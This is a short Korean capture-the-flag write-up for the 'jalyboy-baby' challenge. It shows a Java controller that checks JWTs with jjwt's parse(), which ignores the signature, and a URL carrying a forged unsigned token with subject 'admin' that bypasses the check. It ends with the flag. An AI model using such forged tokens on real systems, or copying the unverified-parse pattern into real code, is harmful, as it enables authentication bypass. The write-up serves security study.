## jalyboy-baby

```java
public class JwtController {

    public static final String ADMIN = "admin";
    public static final String GUEST = "guest";
    public static final String UNKNOWN = "unknown";
    public static final String FLAG = System.getenv("FLAG");
    Key secretKey = Keys.secretKeyFor(SignatureAlgorithm.HS256);

    @GetMapping("/")
    public String index(@RequestParam(required = false) String j, Model model) {
        String sub = UNKNOWN;
        String jwt_guest = Jwts.builder().setSubject(GUEST).signWith(secretKey).compact();

        try {
            Jwt jwt = Jwts.parser().setSigningKey(secretKey).parse(j);
            Claims claims = (Claims) jwt.getBody();
            if (claims.getSubject().equals(ADMIN)) {
                sub = ADMIN;
            } else if (claims.getSubject().equals(GUEST)) {
                sub = GUEST;
            }
        } catch (Exception e) {
//            e.printStackTrace();
        }

        model.addAttribute("jwt", jwt_guest);
        model.addAttribute("sub", sub);
        if (sub.equals(ADMIN)) model.addAttribute("flag", FLAG);

        return "index";
    }
}
```

io.jsonwebtoken 라이브러리의 jwt.parse() 메소드는 jwt token의 signature 부분에 대한 검증을 진행하지 않는다.

```
http://34.84.28.50:10000/?j=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.
```

위와 같이 user를 admin으로 변경한 후 서버로 전송하면 플래그를 획득할 수 있다.

```
LINECTF{337e737f9f2594a02c5c752373212ef7}
```